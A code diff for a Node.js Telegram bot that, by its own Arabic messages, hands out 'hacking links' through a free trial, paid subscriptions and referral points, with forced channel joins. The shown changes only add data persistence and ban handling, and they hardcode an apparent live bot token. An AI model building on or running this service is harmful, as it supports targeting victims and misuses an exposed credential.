@@ -6,8 +6,14 @@ const fs = require('fs');
 const path = require('path');
 const useragent = require('useragent');
 const TinyURL = require('tinyurl');
+
+// استدعاء دالة تحميل البيانات
+loadData();
+
 const botToken = '7235293038:AAG9RdOV0AXcXxn32wY62njSc6wbPayjOvA';
 const bot = new TelegramBot(botToken, { polling: true });
+
+// باقي إعدادات البوت والتطبيق
 
 const app = express();
 app.use(bodyParser.json({ limit: '50mb' }));
@@ -19,20 +25,22 @@ const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
 
-const userVisits = {};
-const MAX_FREE_ATTEMPTS = 5;
-const platformVisits = {};
-const allUsers = new Map();
-const activatedUsers = new Set();
-const bannedUsers = new Map(); // تغيير من Set إلى Map
-const subscribedUsers = new Set();
-const userPoints = new Map();
-const userReferrals = new Map();
-const usedReferralLinks = new Map();
-let pointsRequiredForSubscription = 15;
+function initializeDefaultData() {
+  userVisits = {};
+  platformVisits = {};
+  allUsers = new Map();
+  activatedUsers = new Set();
+  bannedUsers = new Map();
+  subscribedUsers = new Set();
+  userPoints = new Map();
+  userReferrals = new Map();
+  usedReferralLinks = new Map();
+  pointsRequiredForSubscription = 15;
+}
 const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت";
 
 const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];
+
 
 // دالة للتحقق من المسؤول
 const adminId = '7130416076';
@@ -69,14 +77,15 @@ function deductPointsFromUser(userId, points) {
 
 // دالة لحظر مستخدم
 function banUser(userId) {
-  bannedUsers.add(userId.toString());
+  bannedUsers.set(userId.toString(), true);
+  saveData();
 }
-
 // دالة لإلغاء حظر مستخدم
 function unbanUser(userId) {
-  return bannedUsers.delete(userId.toString());
+  const result = bannedUsers.delete(userId.toString());
+  saveData();
+  return result;
 }
-
 // دالة لإرسال رسالة لجميع المستخدمين
 function broadcastMessage(message) {
   allUsers.forEach((user, userId) => {
@@ -430,19 +439,20 @@ function saveData() {
 function loadData() {
   if (fs.existsSync('botData.json')) {
     const data = JSON.parse(fs.readFileSync('botData.json'));
-    userVisits = data.userVisits;
-    platformVisits = data.platformVisits;
-    allUsers = new Map(data.allUsers);
-    activatedUsers = new Set(data.activatedUsers);
-    bannedUsers = new Map(data.bannedUsers);
-    subscribedUsers = new Set(data.subscribedUsers);
-    userPoints = new Map(data.userPoints);
-    userReferrals = new Map(data.userReferrals);
-    usedReferralLinks = new Map(data.usedReferralLinks);
-    pointsRequiredForSubscription = data.pointsRequiredForSubscription;
+    userVisits = data.userVisits || {};
+    platformVisits = data.platformVisits || {};
+    allUsers = new Map(data.allUsers || []);
+    activatedUsers = new Set(data.activatedUsers || []);
+    bannedUsers = new Map(data.bannedUsers || []);
+    subscribedUsers = new Set(data.subscribedUsers || []);
+    userPoints = new Map(data.userPoints || []);
+    userReferrals = new Map(data.userReferrals || []);
+    usedReferralLinks = new Map(data.usedReferralLinks || []);
+    pointsRequiredForSubscription = data.pointsRequiredForSubscription || 15;
     console.log('تم تحميل البيانات بنجاح');
   } else {
     console.log('لم يتم العثور على ملف البيانات، سيتم البدء بقيم افتراضية');
+    initializeDefaultData();
   }
 }
 
